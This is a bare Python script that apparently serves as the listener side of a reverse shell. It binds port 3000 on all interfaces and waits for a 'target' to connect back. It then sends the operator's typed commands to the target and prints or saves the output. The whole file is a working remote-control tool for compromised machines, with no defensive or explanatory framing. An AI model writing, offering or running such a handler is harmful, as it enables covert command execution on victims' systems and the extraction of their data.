import socket
import threading


def start(client):

    file = None
    filepath = None
    output = False

    while True:
        server_in = input("input -> ")
        if server_in == "!exit":
            print("===[disconnected client!]===")
            sock.shutdown(2)
            sock.close()
            client.close()
            break
        if "!>" in server_in:
            filepath = server_in.split("!>")[1]
            server_in = server_in.split("!>")[0]
            output = True
        try:
            client.send(server_in.encode())
        except:
            client.close()
            continue

        data = client.recv(2048)
        if data == b'':
            print(" ===[closing disconnected socket!]===")
            client.close()
            sock.close()
            break
        else:
            print(f"===[target output]===\n{data.decode()}")
            if output:
                open(filepath, "w+").write(data.decode())
                output = False


while True:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("0.0.0.0", 3000))

    print("waiting for connection to target!")
    sock.listen(1)
    client, addr = sock.accept()
    print(f"client connected from {addr}")

    start(client)
